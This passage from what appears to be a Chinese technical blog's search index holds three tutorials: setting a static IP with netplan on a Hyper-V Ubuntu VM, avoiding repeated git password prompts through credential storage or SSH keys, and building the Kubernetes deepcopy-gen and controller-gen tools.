class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br>network:<br>  version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>    eth0:                           <span class="hljs-comment"># 配置网卡的名称,通过 ip a 命令查看</span><br>      dhcp4: <span class="hljs-literal">false</span>                    <span class="hljs-comment"># 关闭 DHCP，如果需要打开 DHCP 则写 true</span><br>      addresses: [172.24.48.67/20]    <span class="hljs-comment"># 配置的静态 IP 地址和掩码</span><br>      optional: <span class="hljs-literal">true</span><br>      gateway4: 172.24.48.1            <span class="hljs-comment"># 网关地址</span><br>      nameservers:<br>        addresses: [8.8.8.8,114.114.114.114]       <span class="hljs-comment"># DNS 服务器地址，多个 DNS 服务器地址需要用英文逗号分隔开</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>网关地址如何确定呢？</p><p>我用的是hyper-v启动的虚拟机，</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165746966.png" alt="image-20220716165746966"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165911473.png" alt="image-20220716165911473"></p><h3 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># netplan apply</span><br></code></pre></td></tr></table></figure><h3 id="查看网卡设置是否生效"><a href="#查看网卡设置是否生效" class="headerlink" title="查看网卡设置是否生效"></a>查看网卡设置是否生效</h3><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165204632.png" alt="image-20220716165204632"></p><p>已经生效！</p><h3 id="测试网络连通性"><a href="#测试网络连通性" class="headerlink" title="测试网络连通性"></a>测试网络连通性</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165432286.png" alt="image-20220716165432286"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_56752399/article/details/115564741?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-115564741-blog-122279914.pc_relevant_sortByStrongTime&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Ubuntu 20.10设置静态IP地址</a><br><a href="https://blog.csdn.net/vincent_duan/article/details/120145526">Hyper-V 和Ubuntu Server 16.04 配置静态IP</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【git】git每次都要输入密码</title>
    <link href="/2022/05/22/git/%E3%80%90git%E3%80%91git%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/"/>
    <url>/2022/05/22/git/%E3%80%90git%E3%80%91git%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="windows和linux下避免git-clone和push时每次都需要输入用户名和密码"><a href="#windows和linux下避免git-clone和push时每次都需要输入用户名和密码" class="headerlink" title="windows和linux下避免git clone和push时每次都需要输入用户名和密码"></a>windows和linux下避免git clone和push时每次都需要输入用户名和密码</h1><p>git 可以用 https 方式访问也可以用 ssh 方式访问</p><p>1）https：就是你每次要输入密码那种</p><p>2）ssh：用公钥私钥  本地用ssh-keygen生成密钥，分为 私钥和公钥，私钥本地保存，公钥放到服务端</p><h2 id="方法一：https协议-配置全局开机存储认证信息"><a href="#方法一：https协议-配置全局开机存储认证信息" class="headerlink" title="方法一：https协议 配置全局开机存储认证信息"></a>方法一：https协议 配置全局开机存储认证信息</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>参考：<a href="https://blog.csdn.net/zhangxiaoyang0/article/details/69239734">windows下git http协议保存用户名密码</a></p><p>打开个人文件夹，一般为C:\Documents and Settings\用户名，其中有一个.gitconfig的文件，使用记事本打开。如果之前配置了名字和email的话，在这里面会看到。</p><p>如何添加配置呢？</p><p>1）打开.gitconfig文件夹 追加如下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[credential]</span><br><span class="hljs-attr">helper</span>=store<br></code></pre></td></tr></table></figure><p>2）在终端(git bash)执行   执行之后，可以看到~&#x2F;.gitconfig文件，也会多了上面那项    直接在</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git config --<span class="hljs-keyword">global</span> credential.helper <span class="hljs-keyword">store</span> <br></code></pre></td></tr></table></figure><p>下次我们再次输入用户名之后，<a href="https://so.csdn.net/so/search?q=git&spm=1001.2101.3001.7020">git</a>就会记住用户名密码，以后就不需再输入了。</p><p>这时在上述那个目录底下，可发现生成另外一个文件.git-credentials，里面记录的就是用户名<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E7%A0%81&spm=1001.2101.3001.7020">密码</a>了。格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://&#123;username&#125;:&#123;password&#125;@github.com<br></code></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>参考：<a href="https://www.bbsmax.com/A/xl56WaDodr/">Linux之解决每次git pull&#x2F;git push都需输入密码设置</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 执行这两条命令</span><br><span class="hljs-built_in">cd</span> /   <span class="hljs-comment"># 我是在/root下面执行的下面的这个命令，所以我的.gitconfig和.git-credentials文件是在/root下生成的</span><br>git config --global credential.helper store<br><br><span class="hljs-comment"># 执行完命令之后会在.gitconfig文件中了下面的内容</span><br>[credential]<br>        helper = store<br><br><span class="hljs-built_in">cd</span>到项目目录，执行git pull,会提示输入账号密码。输完这一次以后git pull或git push就不在需要输入密码了（会在根目录生成一个 .git-credentials 文件）<br><br>over！！！<br></code></pre></td></tr></table></figure><p>其实和windows是一样的！</p><h2 id="方法二：ssh协议"><a href="#方法二：ssh协议" class="headerlink" title="方法二：ssh协议"></a>方法二：ssh协议</h2><p>本地用ssh-keygen生成密钥，分为 私钥和公钥，私钥本地保存，公钥放到服务端</p><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># find / -name ssh-keygen</span><br>find: ‘/run/user/1000/doc’: Permission denied<br>find: ‘/run/user/1000/gvfs’: Permission denied<br>/snap/core20/1587/usr/bin/ssh-keygen<br>/snap/core20/1587/usr/share/bash-completion/completions/ssh-keygen<br>/usr/share/bash-completion/completions/ssh-keygen<br>/usr/bin/ssh-keygen<br>[root@ubuntu-22 ~]<span class="hljs-comment">#</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># /usr/bin/ssh-keygen</span><br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/root/.ssh/id_rsa):<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved <span class="hljs-keyword">in</span> /root/.ssh/id_rsa<br>Your public key has been saved <span class="hljs-keyword">in</span> /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:fyr7kENOycEK99SmHaYL3b5tPozhbvykX5ZNUtEai94 root@ubuntu-22<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|               ..|</span><br><span class="hljs-string">|       . .    . o|</span><br><span class="hljs-string">|    . . + =  . +.|</span><br><span class="hljs-string">|     o * X .. o. |</span><br><span class="hljs-string">|      o S o. .. .|</span><br><span class="hljs-string">|       = =. . E= |</span><br><span class="hljs-string">|        *oo+o + .|</span><br><span class="hljs-string">|        .o=B+o   |</span><br><span class="hljs-string">|        .**==.   |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br><span class="hljs-string">[root@ubuntu-22 ~]#</span><br><span class="hljs-string">[root@ubuntu-22 ~]# cd .ssh</span><br><span class="hljs-string">[root@ubuntu-22 .ssh]# ll</span><br><span class="hljs-string">total 20</span><br><span class="hljs-string">drwx------ 2 root root 4096  1月 29 17:07 ./</span><br><span class="hljs-string">drwx------ 6 root root 4096  1月 29 17:06 ../</span><br><span class="hljs-string">-rw------- 1 root root 2602  1月 29 17:07 id_rsa</span><br><span class="hljs-string">-rw-r--r-- 1 root root  568  1月 29 17:07 id_rsa.pub</span><br><span class="hljs-string">-rw-r--r-- 1 root root  142  1月 29 17:06 known_hosts</span><br><span class="hljs-string">[root@ubuntu-22 .ssh]#</span><br><span class="hljs-string">[root@ubuntu-22 .ssh]# cat id_rsa.pub</span><br><span class="hljs-string">ssh-rsa ... root@ubuntu-22</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>github   设置    把这个公钥放到github的ssh中</p><p>这下通过git clone ssh的方式就可以成功clone下来了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># git clone git@github.com:xxx/xxx.git</span><br>Cloning into <span class="hljs-string">&#x27;xxx&#x27;</span>...<br>remote: Enumerating objects: 3, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (3/3), <span class="hljs-keyword">done</span>.<br>remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0<br>Receiving objects: 100% (3/3), <span class="hljs-keyword">done</span>.<br><br></code></pre></td></tr></table></figure><p>git push也可以了</p><p>参考：<a href="https://blog.csdn.net/weixin_42072280/article/details/122540366?spm=1001.2014.3001.5501">github设置添加SSH</a></p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【go语言系列】安装k8s的controller相关组件：deepcopy-gen和controller-gen</title>
    <link href="/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/"/>
    <url>/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/</url>
    
    <content type="html"><![CDATA[<h2 id="deepcopy-gen"><a href="#deepcopy-gen" class="headerlink" title="deepcopy-gen"></a>deepcopy-gen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">go get -u k8s.io/code-generator/...<br><span class="hljs-comment"># 上面如果不成功，手工安装各种工具</span><br>git <span class="hljs-built_in">clone</span> https://github.com/kubernetes/code-generator<br><span class="hljs-built_in">cd</span> code-generator<br>go build -o deepcopy-gen cmd/deepcopy-gen/main.go<br><span class="hljs-built_in">cp</span> deepcopy-gen ~/go_projects/bin/   <span class="hljs-comment"># 放到/usr/local/bin下也可以</span><br></code></pre></td></tr></table></figure><p>参考： <a href="https://www.cxyzjd.com/article/ch717828/106008698">https://www.cxyzjd.com/article/ch717828/106008698</a></p><h2 id="controller-gen"><a href="#controller-gen" class="headerlink" title="controller-gen"></a>controller-gen</h2><p>下载地址：<a href="https://github.com/kubernetes-sigs/controller-tools/releases">https://github.com/kubernetes-sigs/controller-tools/releases</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/controller-tools/archive/refs/tags/v0.8.0.tar.gz</span><br><span class="hljs-comment"># tar -zxvf v0.8.0.tar.gz</span><br><span class="hljs-comment"># cd controller-tools-0.8.0</span><br><span class="hljs-comment"># go build -a -o controller-gen cmd/controller-gen/main.go</span><br><span class="hljs-comment"># mv controller-gen /usr/local/bin/</span><br><span class="hljs-comment"># controller-gen --version</span><br>Version: (devel)<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://support.huaweicloud.com/devg-osc/osc_ss_0052.html">https://support.huaweicloud.com/devg-osc/osc_ss_0052.html</a></p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
